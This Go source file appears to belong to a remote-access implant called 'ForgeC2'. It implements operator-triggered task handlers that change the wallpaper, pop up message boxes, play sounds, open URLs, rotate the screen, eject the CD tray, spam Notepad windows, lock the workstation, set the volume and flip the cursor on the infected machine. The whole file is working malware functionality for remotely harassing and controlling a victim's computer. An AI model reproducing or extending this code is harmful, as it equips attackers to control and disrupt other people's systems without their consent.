//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

// ── Wallpaper Change ────────────────────────────────────────────────────

func handleWallpaperChange(task Task, res *TaskResult) {
	if task.Command == "" {
		res.Error = "image path or URL is required"
		return
	}
	if runtime.GOOS == "windows" {
		res.Output = setWallpaperWindows(task.Command)
	} else if runtime.GOOS == "linux" {
		cmd := exec.Command("gsettings", "set", "org.gnome.desktop.background", "picture-uri", "file://"+task.Command)
		if err := cmd.Run(); err != nil {
			res.Error = "gsettings failed: " + err.Error()
			return
		}
		res.Output = "wallpaper changed"
	} else {
		res.Error = "unsupported OS"
	}
}

// ── MessageBox ──────────────────────────────────────────────────────────

func handleMsgBox(task Task, res *TaskResult) {
	if task.Command == "" {
		res.Error = "message text is required"
		return
	}
	if runtime.GOOS != "windows" {
		res.Error = "msgbox is Windows only"
		return
	}
	title := task.Shell
	if title == "" {
		title = "ForgeC2"
	}
	res.Output = showMsgBoxWindows(task.Command, title)
}

// ── Play Sound ──────────────────────────────────────────────────────────

func handlePlaySound(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "play_sound is Windows only"
		return
	}
	if task.Command == "" {
		res.Output = playBeepWindows()
	} else {
		res.Output = playSoundWindows(task.Command)
	}
}

// ── Open URL ────────────────────────────────────────────────────────────

func handleOpenURL(task Task, res *TaskResult) {
	if task.Command == "" {
		res.Error = "URL is required"
		return
	}
	switch runtime.GOOS {
	case "windows":
		res.Output = openURLWindows(task.Command)
	case "linux":
		cmd := exec.Command("xdg-open", task.Command)
		if err := cmd.Start(); err != nil {
			res.Error = "xdg-open failed: " + err.Error()
			return
		}
		res.Output = "URL opened"
	case "darwin":
		cmd := exec.Command("open", task.Command)
		if err := cmd.Start(); err != nil {
			res.Error = "open failed: " + err.Error()
			return
		}
		res.Output = "URL opened"
	default:
		res.Error = "unsupported OS"
	}
}

// ── Screen Rotate ───────────────────────────────────────────────────────

func handleScreenRotate(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "screen_rotate is Windows only"
		return
	}
	res.Output = screenRotateWindows()
}

// ── CD-ROM Tray ─────────────────────────────────────────────────────────

func handleCDRomTray(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "cdrom_tray is Windows only"
		return
	}
	action := strings.ToLower(strings.TrimSpace(task.Command))
	if action != "open" && action != "close" {
		res.Error = "action must be 'open' or 'close'"
		return
	}
	res.Output = cdRomTrayWindows(action)
}

// ── Notepad Spam ────────────────────────────────────────────────────────

func handleNotepadSpam(task Task, res *TaskResult) {
	count := 5
	if task.Command != "" {
		if n, err := strconv.Atoi(strings.TrimSpace(task.Command)); err == nil {
			count = n
		}
	}
	if count < 1 {
		count = 1
	}
	if count > 20 {
		count = 20
	}
	opened := 0
	for i := 0; i < count; i++ {
		cmd := exec.Command("notepad.exe")
		_ = cmd.Start()
		opened++
	}
	res.Output = fmt.Sprintf("opened %d notepad windows", opened)
}

// ── Lock Workstation ────────────────────────────────────────────────────

func handleLockWorkstation(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "lock_workstation is Windows only"
		return
	}
	res.Output = lockWorkstationWindows()
}

// ── Set Volume ──────────────────────────────────────────────────────────

func handleSetVolume(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "set_volume is Windows only"
		return
	}
	level, err := strconv.Atoi(strings.TrimSpace(task.Command))
	if err != nil {
		res.Error = "invalid volume level: " + task.Command
		return
	}
	if level < 0 {
		level = 0
	}
	if level > 100 {
		level = 100
	}
	res.Output = setVolumeWindows(level)
}

// ── Cursor Flip ─────────────────────────────────────────────────────────

func handleCursorFlip(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "cursor_flip is Windows only"
		return
	}
	res.Output = cursorFlipWindows()
}
